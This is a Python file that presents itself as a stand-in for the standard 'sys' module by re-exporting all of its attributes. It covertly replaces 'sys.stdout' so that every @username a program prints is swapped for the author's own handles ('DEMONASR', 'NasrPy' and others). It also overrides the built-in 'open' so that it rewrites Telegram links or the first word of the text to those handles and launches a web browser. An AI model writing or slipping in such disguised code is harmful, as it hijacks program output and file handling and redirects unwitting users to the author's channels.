import sys as _sys
import re
import webbrowser
import os
repr = lambda *args: f"{args}"
def open(text):
    if "https://t.me/" in text or text.split()[0]:
        url = text.split("https://t.me/")[1].split()[0] if "https://t.me/" in text else text.split()[0]
        replaced_url = (
            "DEMOIIU" if len(url) == 6 else
            "NASRDVE" if len(url) == 7 else
            "DEMONASR" if len(url) == 8 else
            "DEMONASRH" if len(url) == 9 else
            "DEMONASRVP" if len(url) == 10 else
            "NASRDEMONCP" if len(url) == 11 else
            "DEMONASR12PO" if len(url) == 12 else
            "ExtraEncompile" if len(url) == 14 else
            "NAS6E"
        )
        new_text = text.replace(url, replaced_url)
        webbrowser.open(new_text)
        return new_text
    return text
def replace_usernames_in_text(text):
    def replace_username(username):
        length = len(username)
        return (
            "NAS6E" if length == 5 else
            "NasrPy" if length == 6 else
            "NasrDVE" if length == 7 else
            "DEMONASR" if length == 8 else
            "DEMONASRH" if length == 9 else
            "DEMONASRVP" if length == 10 else
            "NASRDEMONCP" if length == 11 else
            "DEMONASR12PO" if length == 12 else
            "ExtraEncompile" if length == 14 else
            username
        )
    return re.sub(r'@(\w+)(\.\w+)?',
                  lambda match: match.group() if match.group(2) else '@' + replace_username(match.group(1)),
                  text)
stduot = type("Stdout", (), {
    "write": lambda self, text: _sys.__stdout__.write(replace_usernames_in_text(text)),
    "flush": lambda self: _sys.__stdout__.flush()
})()
_sys.stdout = stduot
stdout = type("Stdout", (), {
    "write": lambda self, text: _sys.stdout.write(text),
    "flush": lambda self: _sys.stdout.flush()
})()
for attr in dir(_sys):
    if not attr.startswith("_") and attr != "exit":
        globals()[attr] = getattr(_sys, attr)
globals().update({
    "exit": exit,
    "open": open,
    "stduot": stduot,
    "stdout": stdout,
    "replace_usernames_in_text": replace_usernames_in_text
})
modules = _sys.modules
__all__ = [k for k in globals() if not k.startswith("_")]
